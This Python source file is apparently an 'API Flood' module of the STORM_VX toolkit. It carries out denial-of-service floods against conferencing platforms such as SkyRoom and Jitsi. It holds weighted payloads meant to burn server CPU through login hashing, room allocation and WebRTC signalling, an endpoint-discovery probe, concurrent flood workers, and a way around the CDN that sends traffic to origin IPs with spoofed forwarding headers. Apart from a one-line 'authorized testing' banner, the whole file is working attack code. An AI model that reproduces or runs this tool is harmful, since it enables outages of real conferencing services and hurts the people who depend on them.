#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VF API Flood — REST API Flood Attack Module                            ║
║  Part of the STORM_VX Toolkit                                          ║
║                                                                          ║
║  Targets REST API endpoints with conferencing-specific payloads.        ║
║  Designed for platforms like SkyRoom, Adobe Connect, Jitsi, etc.        ║
║                                                                          ║
║  Key insight: Conferencing platforms have STATEFUL API endpoints that    ║
║  are far more expensive than simple GET requests:                        ║
║  - Room join/leave → allocates server resources (Redis, media server)   ║
║  - Chat send → broadcasts to all room members                           ║
║  - WebRTC signaling → triggers SDP processing + ICE candidate routing   ║
║  - Screen share → allocates video transcoding resources                 ║
║  - Auth/login → bcrypt password hashing = massive CPU burn              ║
║                                                                          ║
║  Unlike the built-in _worker_api(), this module:                        ║
║  1. Targets conference-specific endpoints                                ║
║  2. Sends realistic payloads that trigger heavy server processing        ║
║  3. Can attack origin IPs directly (CDN bypass)                         ║
║  4. Reports stats back to VFTester's dashboard via callback             ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import random
import string
import json
from typing import Dict, List, Callable, Awaitable
from urllib.parse import urlparse

from vf_common import C, USER_AGENTS, random_ua, rand_user, rand_pass, rand_str, rand_cache_bust, ssl_param
from utils.session_helpers import attack_timeout
from config.defaults import DEFAULT_PER_HOST_LIMIT, DEFAULT_DNS_CACHE_TTL, DEFAULT_KEEPALIVE_TIMEOUT, ATTACK_SESSION_TIMEOUT, ATTACK_SESSION_CONNECT, ATTACK_SESSION_SOCK_READ, ATTACK_REQUEST_TIMEOUT, WORKER_CLEANUP_TIMEOUT

try:
    import aiohttp
    _HAS_AIOHTTP = True
except ImportError:
    aiohttp = None
    _HAS_AIOHTTP = False


class APIFloodAttacker:
    """
    REST API Flood Attack for conferencing platforms.

    Discovers and attacks API endpoints with realistic conferencing
    payloads that trigger expensive server-side processing.
    """

    # ─── Conference API Endpoint Patterns ──────────────────────────────────
    # These are common REST API patterns used by conferencing platforms.
    # SkyRoom, Jitsi, BigBlueButton, etc. all follow similar patterns.
    CONFERENCE_API_ENDPOINTS = [
        # Auth endpoints — bcrypt/scrypt = massive CPU
        "/api/auth/login",
        "/api/auth/register",
        "/api/auth/refresh-token",
        "/api/auth/forgot-password",
        "/api/v1/auth/login",
        "/api/v1/users/login",
        "/login",
        "/signin",
        "/api/signin",
        # Room management — allocates Redis/media resources
        "/api/room/join",
        "/api/room/create",
        "/api/room/leave",
        "/api/room/info",
        "/api/room/list",
        "/api/rooms",
        "/api/v1/room/join",
        "/api/v1/rooms",
        "/api/conference/join",
        "/api/conference/create",
        # Chat — broadcasts to all room members
        "/api/chat/send",
        "/api/chat/history",
        "/api/chat/typing",
        "/api/v1/chat/send",
        "/api/messages",
        # WebRTC signaling — triggers SDP processing + ICE routing
        "/api/signal/offer",
        "/api/signal/answer",
        "/api/signal/ice-candidate",
        "/api/webrtc/signal",
        "/api/v1/signal/offer",
        # Screen share — allocates video transcoding
        "/api/screen-share/start",
        "/api/screen-share/stop",
        "/api/v1/screen-share/start",
        "/api/presentation/start",
        # User presence — forces server state updates
        "/api/presence/update",
        "/api/user/status",
        "/api/v1/presence",
        # File sharing — triggers upload processing
        "/api/file/upload",
        "/api/files/upload",
        "/api/v1/upload",
        # Recording — triggers media processing
        "/api/recording/start",
        "/api/recording/stop",
        # Poll/Quiz — triggers real-time broadcast
        "/api/poll/create",
        "/api/poll/vote",
        # General API
        "/api/",
        "/api/v1/",
        "/api/v2/",
        "/graphql",
        "/api/config",
        "/api/settings",
        "/api/health",
    ]

    # ─── Conference-specific JSON payloads ─────────────────────────────────
    # Each payload is designed to trigger MAXIMUM server-side processing.

    def _payload_room_join(self):
        """Room join — forces server to allocate room resources in Redis."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "userId": f"user_{rand_str(8)}",
            "username": f"guest_{rand_str(6)}",
            "displayName": f"User {random.randint(1000, 9999)}",
            "role": random.choice(["participant", "presenter", "moderator"]),
            "password": rand_pass(),
            "camera": random.choice([True, False]),
            "microphone": random.choice([True, False]),
            "screenShare": random.random() > 0.7,
        }

    def _payload_room_create(self):
        """Room creation — allocates new server resources."""
        return {
            "name": f"Meeting {rand_str(8)}",
            "description": "Urgent discussion " + rand_str(20),
            "maxParticipants": random.randint(2, 500),
            "duration": random.randint(30, 480),
            "password": rand_pass(),
            "recording": random.choice([True, False]),
            "waitingRoom": random.choice([True, False]),
        }

    def _payload_chat_send(self):
        """Chat message — triggers broadcast to ALL room members."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "message": "".join(random.choices(string.ascii_letters + string.digits + " ", k=random.randint(50, 500))),
            "type": random.choice(["text", "image", "file", "link"]),
            "replyTo": random.choice([None, f"msg_{rand_str(8)}"]),
            "userId": f"user_{rand_str(8)}",
        }

    def _payload_signal_offer(self):
        """WebRTC signaling offer — triggers HEAVY SDP processing."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "type": "offer",
            "sdp": (
                f"v=0\r\n"
                f"o=- {random.randint(100000, 999999)} 2 IN IP4 0.0.0.0\r\n"
                f"s=-\r\n"
                f"t=0 0\r\n"
                f"a=group:BUNDLE 0 1 2\r\n"
                f"m=audio 9 UDP/TLS/RTP/SAVPF 111\r\n"
                f"c=IN IP4 0.0.0.0\r\n"
                f"a=ice-ufrag:{rand_str(4)}\r\n"
                f"a=ice-pwd:{rand_str(22)}\r\n"
                f"a=fingerprint:sha-256 {':'.join([format(random.randint(0, 255), '02X') for _ in range(32)])}\r\n"
                f"a=setup:actpass\r\n"
                f"m=video 9 UDP/TLS/RTP/SAVPF 96 97 98\r\n"
            ),
            "from": f"user_{rand_str(8)}",
            "to": f"user_{rand_str(8)}",
        }

    def _payload_ice_candidate(self):
        """ICE candidate — triggers TURN/STUN processing."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "type": "ice-candidate",
            "candidate": (
                f"candidate:{random.randint(0, 1000)} 1 udp {random.randint(10000, 99999)} "
                f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)} "
                f"{random.randint(10000, 60000)} typ host"
            ),
            "from": f"user_{rand_str(8)}",
            "to": f"user_{rand_str(8)}",
        }

    def _payload_screen_share(self):
        """Screen share start — triggers video stream allocation."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "action": "start",
            "userId": f"user_{rand_str(8)}",
            "resolution": random.choice(["1920x1080", "1280x720", "3840x2160"]),
            "fps": random.choice([15, 30, 60]),
            "codec": random.choice(["VP8", "VP9", "H264", "AV1"]),
            "bitrate": random.randint(500000, 8000000),
        }

    def _payload_auth_login(self):
        """Auth login — triggers bcrypt/scrypt password hashing = massive CPU."""
        return {
            "username": rand_user(),
            "password": rand_pass(),
            "email": f"{rand_str(8)}@{rand_str(6)}.com",
            "rememberMe": True,
            "deviceInfo": {
                "deviceId": rand_str(16),
                "platform": random.choice(["web", "android", "ios", "desktop"]),
                "version": f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 99)}",
            },
        }

    def _payload_presence(self):
        """Presence update — forces server to update room state for all members."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "userId": f"user_{rand_str(8)}",
            "status": random.choice(["online", "away", "busy", "invisible"]),
            "device": random.choice(["desktop", "mobile", "tablet"]),
        }

    def _payload_file_upload(self):
        """File upload — triggers server file handling and storage."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "fileName": f"document_{rand_str(8)}.pdf",
            "fileSize": random.randint(100000, 50000000),
            "mimeType": random.choice([
                "application/pdf", "image/png", "image/jpeg",
                "application/vnd.ms-excel", "application/zip",
            ]),
            "userId": f"user_{rand_str(8)}",
        }

    def _payload_recording_start(self):
        """Recording start — triggers media server resource allocation."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "action": "start",
            "quality": random.choice(["720p", "1080p", "4k"]),
            "layout": random.choice(["grid", "speaker", "presentation"]),
            "userId": f"user_{rand_str(8)}",
        }

    def _payload_poll_create(self):
        """Poll creation — triggers real-time broadcast to all participants."""
        return {
            "roomId": f"room_{rand_str(6)}",
            "question": f"Survey question {rand_str(20)}?",
            "options": [f"Option {i}: {rand_str(10)}" for i in range(random.randint(2, 6))],
            "anonymous": random.choice([True, False]),
            "userId": f"user_{rand_str(8)}",
        }

    # ─── Payload registry with weights ─────────────────────────────────────
    # Higher weight = more likely to be selected
    PAYLOAD_REGISTRY = None  # Initialized in __init__ because lambdas can't reference self

    def __init__(self, url: str, workers: int = 50, requests_per_second: int = 20,
                 origin_ips: List[str] = None, stats_callback=None,
                 verify_ssl: bool = True, **kwargs):
        self.url = url
        self.workers = workers
        self.requests_per_second = requests_per_second
        self.origin_ips = origin_ips or []
        self.stats_callback = stats_callback  # Callback to report results to VFTester
        # ARCH-3: verify_ssl is now a proper constructor parameter
        self._verify_ssl = verify_ssl

        self.parsed = urlparse(url)
        self.host = self.parsed.hostname or ""
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.is_ssl = self.parsed.scheme == "https"
        self.domain = self.host

        # Extract room path from URL (e.g., /ch/payam_m2/payam-m2-10-1-405)
        self.room_path = self.parsed.path or "/"

        # Build conference-specific endpoints from the URL
        self._custom_endpoints = self._build_custom_endpoints()

        # Payload registry with weights — higher weight = more server load
        self.PAYLOAD_REGISTRY = [
            (self._payload_room_join,     20),   # Most expensive: allocates room resources
            (self._payload_room_create,   15),   # Allocates new resources
            (self._payload_auth_login,    15),   # bcrypt/scrypt = CPU burn
            (self._payload_chat_send,     12),   # Broadcast to all members
            (self._payload_signal_offer,  10),   # Heavy SDP processing
            (self._payload_ice_candidate, 8),    # TURN/STUN processing
            (self._payload_screen_share,  7),    # Video stream allocation
            (self._payload_presence,      5),    # State update broadcast
            (self._payload_file_upload,   4),    # File handling
            (self._payload_recording_start, 2),  # Media server allocation
            (self._payload_poll_create,   2),    # Real-time broadcast
        ]

        # Stats tracking
        self.stats = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "waf_blocked": 0,
            "origin_requests": 0,
            "origin_success": 0,
            "endpoints_discovered": 0,
            "bytes_sent": 0,
            "errors": 0,
        }
        self._lock: asyncio.Lock | None = None
        self._start_time = 0.0

        # Discovered working endpoints
        self._discovered_endpoints: List[str] = []

    def _build_custom_endpoints(self) -> List[str]:
        """Build conference-specific API endpoints based on the target URL.
        Extracts the room/conference path and generates related API paths."""
        custom = []
        path = self.parsed.path or "/"

        # If URL has /ch/room pattern (SkyRoom style), generate related API paths
        parts = path.strip("/").split("/")
        if len(parts) >= 2:
            # e.g., /ch/payam_m2/payam-m2-10-1-405
            room_id = parts[-1] if parts else ""
            custom.extend([
                f"/api/room/{room_id}/join",
                f"/api/room/{room_id}/leave",
                f"/api/room/{room_id}/info",
                f"/api/room/{room_id}/chat",
                f"/api/room/{room_id}/signal",
                f"/api/room/{room_id}/screen-share",
                f"/api/room/{room_id}/participants",
                f"/api/room/{room_id}/recording",
                f"/api/conference/{room_id}/join",
                f"/api/v1/room/{room_id}",
            ])

        # Also add the room path itself as a POST target
        custom.append(path)
        custom.append(f"{path}/api/join")
        custom.append(f"{path}/api/chat")

        return custom

    def _ensure_lock(self) -> asyncio.Lock:
        """Lazy-initialize asyncio.Lock within the running event loop."""
        if self._lock is None:
            self._lock = asyncio.Lock()
        return self._lock

    async def _update_stats(self, key: str, delta: int = 1):
        async with self._ensure_lock():
            self.stats[key] = self.stats.get(key, 0) + delta

    async def _get_stats(self) -> Dict:
        async with self._ensure_lock():
            return dict(self.stats)

    def _choose_payload(self):
        """Weighted random payload selection."""
        total_weight = sum(w for _, w in self.PAYLOAD_REGISTRY)
        r = random.uniform(0, total_weight)
        cum = 0
        for payload_fn, weight in self.PAYLOAD_REGISTRY:
            cum += weight
            if r <= cum:
                return payload_fn()
        return self.PAYLOAD_REGISTRY[0][0]()

    def _build_headers(self, host: str = None, is_origin: bool = False) -> Dict[str, str]:
        """Build realistic request headers."""
        headers = {
            "User-Agent": random_ua(),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Origin": f"{'https' if self.is_ssl else 'http'}://{host or self.host}",
            "Referer": self.url,
            "Connection": "keep-alive",
            "Cache-Control": "no-cache, no-store",
            "Pragma": "no-cache",
        }

        if is_origin:
            # When hitting origin directly, add CDN-spoofing headers
            headers["X-Forwarded-Host"] = host or self.domain
            headers["X-Forwarded-Proto"] = "https"
            headers["X-Forwarded-For"] = (
                f"{random.randint(1,255)}.{random.randint(0,255)}."
                f"{random.randint(0,255)}.{random.randint(1,254)}"
            )
            headers["X-Real-IP"] = (
                f"{random.randint(1,255)}.{random.randint(0,255)}."
                f"{random.randint(0,255)}.{random.randint(1,254)}"
            )

        return headers

    async def _discover_endpoints(self, session, stop_event: asyncio.Event) -> List[str]:
        """Quick-probe API endpoints to find which ones exist (200/401/403 = exists)."""
        # B18 extended: Respect verify_ssl setting instead of hardcoding ssl=False
        _ssl = ssl_param(self._verify_ssl)

        discovered = []
        all_endpoints = list(set(
            self.CONFERENCE_API_ENDPOINTS + self._custom_endpoints
        ))

        print(f"  {C.CY}[API-FLOOD] Probing {len(all_endpoints)} API endpoints...{C.RS}")

        # Probe a sample (don't probe all — too slow)
        probe_sample = random.sample(all_endpoints, min(25, len(all_endpoints)))

        for endpoint in probe_sample:
            if stop_event.is_set():
                break
            try:
                url = f"{'https' if self.is_ssl else 'http'}://{self.host}:{self.port}{endpoint}"
                headers = self._build_headers()
                async with session.get(url, headers=headers, ssl=_ssl,
                                       timeout=attack_timeout(total=ATTACK_REQUEST_TIMEOUT),  # W2.4
                                       allow_redirects=False) as resp:
                    # Any non-404 response means the endpoint likely exists
                    if resp.status != 404:
                        discovered.append(endpoint)
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
                pass
            await asyncio.sleep(0.05)  # Small delay between probes

        if discovered:
            print(f"  {C.G}[API-FLOOD] Found {len(discovered)} active endpoints{C.RS}")
        else:
            print(f"  {C.Y}[API-FLOOD] No endpoints confirmed, using all conference endpoints{C.RS}")
            discovered = all_endpoints[:15]  # Use top 15 conference endpoints

        self._discovered_endpoints = discovered
        await self._update_stats("endpoints_discovered", len(discovered))
        return discovered

    async def _api_flood_worker(self, worker_id: int, session, stop_event: asyncio.Event):
        """Single API flood worker — sends conference-specific payloads."""
        # B18 extended: Respect verify_ssl setting instead of hardcoding ssl=False
        _ssl = ssl_param(self._verify_ssl)

        domain_variants = [self.domain]
        base = self.domain
        if base.startswith("www."):
            base = base[4:]
            domain_variants.append(base)
        else:
            domain_variants.append(f"www.{base}")

        consecutive_fails = 0
        while not stop_event.is_set():
            t = time.time()
            try:
                # Choose target endpoint
                if self._discovered_endpoints:
                    endpoint = random.choice(self._discovered_endpoints)
                else:
                    endpoint = random.choice(self.CONFERENCE_API_ENDPOINTS[:15])

                # Choose: hit via CDN or origin IP?
                use_origin = bool(self.origin_ips) and random.random() < 0.4
                if use_origin:
                    origin_ip = random.choice(self.origin_ips)
                    target_url = f"{'https' if self.is_ssl else 'http'}://{origin_ip}{endpoint}"
                    host = random.choice(domain_variants)
                    headers = self._build_headers(host=host, is_origin=True)
                    headers["Host"] = host
                else:
                    target_url = f"{'https' if self.is_ssl else 'http'}://{self.host}{endpoint}"
                    headers = self._build_headers()

                # Choose payload and method
                payload_data = self._choose_payload()
                payload_json = json.dumps(payload_data)
                headers["Content-Type"] = "application/json"

                # Add cache buster
                if random.random() > 0.3:
                    target_url += f"{'&' if '?' in target_url else '?'}{rand_cache_bust()}"

                # Randomly choose HTTP method (mostly POST for maximum server load)
                method = random.choices(
                    ["POST", "PUT", "PATCH", "GET"],
                    weights=[50, 15, 10, 25],
                    k=1
                )[0]

                if method == "GET":
                    async with session.get(target_url, headers=headers, ssl=_ssl,
                                           allow_redirects=False,
                                           timeout=attack_timeout(total=ATTACK_SESSION_TIMEOUT)) as resp:  # W2.4
                        elapsed = time.time() - t
                        await self._update_stats("total_requests")
                        if resp.status < 500:
                            await self._update_stats("successful_requests")
                        else:
                            await self._update_stats("failed_requests")
                        if resp.status in (403, 429, 503):
                            await self._update_stats("waf_blocked")
                        if use_origin:
                            await self._update_stats("origin_requests")
                            if resp.status < 500:
                                await self._update_stats("origin_success")

                        # Report to VFTester via callback (BUG-004 fix: positional args)
                        if self.stats_callback:
                            await self.stats_callback(
                                "api_flood",
                                resp.status < 500,
                                resp.status,
                                elapsed,
                                "",
                                target_url[:60],
                                f"API {method} {resp.status} {'ORI' if use_origin else 'CDN'} {endpoint[:30]}"
                            )
                else:
                    async with session.request(method, target_url, headers=headers,
                                               data=payload_json, ssl=_ssl,
                                               allow_redirects=False,
                                               timeout=attack_timeout(total=ATTACK_SESSION_TIMEOUT)) as resp:  # W2.4
                        elapsed = time.time() - t
                        await self._update_stats("total_requests")
                        await self._update_stats("bytes_sent", len(payload_json))
                        if resp.status < 500:
                            await self._update_stats("successful_requests")
                        else:
                            await self._update_stats("failed_requests")
                        if resp.status in (403, 429, 503):
                            await self._update_stats("waf_blocked")
                        if use_origin:
                            await self._update_stats("origin_requests")
                            if resp.status < 500:
                                await self._update_stats("origin_success")

                        # Report to VFTester via callback (BUG-004 fix: positional args)
                        if self.stats_callback:
                            await self.stats_callback(
                                "api_flood",
                                resp.status < 500,
                                resp.status,
                                elapsed,
                                "",
                                target_url[:60],
                                f"API {method} {resp.status} {'ORI' if use_origin else 'CDN'} {endpoint[:30]}"
                            )

                consecutive_fails = 0

            except asyncio.TimeoutError:
                consecutive_fails += 1  # BUG-001: Increment on timeout failure
                await self._update_stats("total_requests")
                await self._update_stats("failed_requests")
                if self.stats_callback:
                    await self.stats_callback(
                        "api_flood",
                        False,
                        0,
                        time.time() - t,
                        "Timeout",
                        target_url[:60] if 'target_url' in dir() else self.url,
                        f"API TMO {'ORI' if use_origin else 'CDN'}"
                    )
            except asyncio.CancelledError:
                raise
            except (aiohttp.ClientError, OSError, ConnectionError, RuntimeError) as e:
                consecutive_fails += 1  # BUG-001: Increment on general failure
                err_name = type(e).__name__
                await self._update_stats("total_requests")
                await self._update_stats("errors")
                if self.stats_callback:
                    await self.stats_callback(
                        "api_flood",
                        False,
                        0,
                        time.time() - t,
                        err_name,
                        target_url[:60] if 'target_url' in dir() else self.url,
                        f"API ERR {err_name[:20]}"
                    )

            if not stop_event.is_set():
                # Adaptive delay based on success/failure
                if consecutive_fails > 3:
                    await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 5)), 2.0))
                else:
                    delay = 1.0 / max(self.requests_per_second, 1)
                    await asyncio.sleep(delay + random.uniform(0, 0.02))

    async def attack(self, stop_event: asyncio.Event, stats_callback=None) -> Dict:
        """
        Main attack entry point.

        Args:
            stop_event: Event to signal graceful shutdown.
            stats_callback: Optional callback for external stats reporting.
                           Called with positional args: (mode, ok, code, rt, err, url, hint)

        Returns:
            Dict with attack statistics.
        """
        # BUG-002: Guard against missing aiohttp
        if not _HAS_AIOHTTP:
            raise ImportError("aiohttp is required for API flood")

        # BUG-003: Lazy-initialize asyncio.Lock within running event loop
        if self._lock is None:
            self._lock = asyncio.Lock()

        # Override callback if provided at call time
        if stats_callback:
            self.stats_callback = stats_callback

        self._start_time = time.time()

        print(f"{C.BD}[API-FLOOD] Starting API Flood attack{C.RS}")
        print(f"  Target: {C.CY}{self.host}:{self.port}{C.RS}")
        print(f"  Workers: {C.W}{self.workers}{C.RS}")
        print(f"  Req/sec per worker: {C.W}{self.requests_per_second}{C.RS}")
        if self.origin_ips:
            print(f"  Origin IPs: {C.G}{len(self.origin_ips)} (CDN bypass){C.RS}")
        print(f"  Room path: {C.Y}{self.room_path}{C.RS}")
        print(f"  Custom endpoints: {C.G}{len(self._custom_endpoints)}{C.RS}")

        # Create shared session
        connector = aiohttp.TCPConnector(
            limit=self.workers * 2,
            limit_per_host=DEFAULT_PER_HOST_LIMIT,  # W2.4
            enable_cleanup_closed=True,
            ttl_dns_cache=DEFAULT_DNS_CACHE_TTL,    # W2.4
            keepalive_timeout=DEFAULT_KEEPALIVE_TIMEOUT,  # W2.4
            use_dns_cache=True,
        )
        timeout = attack_timeout(total=ATTACK_SESSION_TIMEOUT, connect=ATTACK_SESSION_CONNECT, sock_read=ATTACK_SESSION_SOCK_READ)  # W2.4

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Phase 1: Quick endpoint discovery
            await self._discover_endpoints(session, stop_event)

            # Phase 2: Launch flood workers
            tasks = []
            for i in range(self.workers):
                task = asyncio.create_task(
                    self._api_flood_worker(i, session, stop_event)
                )
                tasks.append(task)

            # Wait for stop signal
            try:
                await stop_event.wait()
            except asyncio.CancelledError:
                pass

            # Cleanup
            for task in tasks:
                task.cancel()
            try:
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=WORKER_CLEANUP_TIMEOUT  # W2.4
                )
            except asyncio.TimeoutError:
                pass  # Workers didn't finish in time, already cancelled

        # Final stats
        elapsed = time.time() - self._start_time
        final_stats = await self._get_stats()
        final_stats["elapsed_seconds"] = round(elapsed, 2)
        final_stats["requests_per_second"] = round(
            final_stats.get("total_requests", 0) / max(elapsed, 1), 2
        )
        final_stats["api_endpoints"] = self._discovered_endpoints[:10]

        print(f"\n{C.BD}[API-FLOOD] Attack finished{C.RS}")
        print(f"  Total requests: {C.W}{final_stats.get('total_requests', 0):,}{C.RS}")
        print(f"  Successful: {C.G}{final_stats.get('successful_requests', 0):,}{C.RS}")
        print(f"  Failed: {C.R}{final_stats.get('failed_requests', 0):,}{C.RS}")
        print(f"  WAF blocked: {C.R}{final_stats.get('waf_blocked', 0)}{C.RS}")
        print(f"  Origin bypass: {C.G}{final_stats.get('origin_success', 0):,}{C.RS}/{final_stats.get('origin_requests', 0):,}")
        print(f"  RPS: {C.CY}{final_stats.get('requests_per_second', 0)}{C.RS}")

        return final_stats

    def get_stats(self) -> Dict:
        """Return current attack statistics (ABC interface)."""
        return dict(self.stats)

    @staticmethod
    def get_info() -> Dict:
        """Return module metadata (ABC interface)."""
        return {
            'name': 'API Flood',
            'description': 'REST API flood attack targeting conference-specific endpoints with CDN bypass',
            'target_type': 'http',
            'requirements': ['aiohttp'],
        }
